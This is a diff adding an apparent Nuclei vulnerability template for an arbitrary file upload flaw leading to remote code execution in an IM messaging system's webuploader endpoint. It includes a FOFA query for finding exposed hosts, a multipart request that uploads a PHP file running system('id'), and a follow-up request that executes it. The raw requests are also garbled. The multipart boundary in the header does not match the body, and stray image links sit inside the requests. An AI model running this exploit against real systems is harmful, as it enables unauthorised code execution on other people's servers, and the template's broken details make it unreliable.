@@ -1,0 +1,50 @@
+id: poc-eqfih5gmggfgi8bm
+info:
+  name: IM即时通讯系统 fileupload.php 存在任意文件上传致RCE漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/eqfih5gmggfgi8bm'
+  tags: rce,file-upload,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: eqfih5gmggfgi8bm
+    fofa: body="/superloginAction.html" || "im.smiaoshen.com"
+http:
+- raw:
+  - 'POST /static/lib/webuploader/0.1.5/server/fileupload.php HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
+
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryTqkdY1lCvbvpmown
+
+
+    ------WebKitFormBoundaryaKljzbg49Mq4ggLz
+
+    Content-Disposition: form-data; name="file"; filename="rce.php"
+
+    Content-Type: text/plain
+
+
+    <?php system("id");unlink(__FILE__);?>
+
+    ------WebKitFormBoundaryaKljzbg49Mq4ggLz--
+
+    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1754121830764-de1aee9e-93b9-43f9-93fc-17072bd793b4.png)'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'GET /static/lib/webuploader/0.1.5/server/upload/rce.php HTTP/1.1
+
+    Host: {{Hostname}}
+
+    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1754121831002-32ff6cdf-f8ab-4963-8bde-6a215da9d230.png)'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
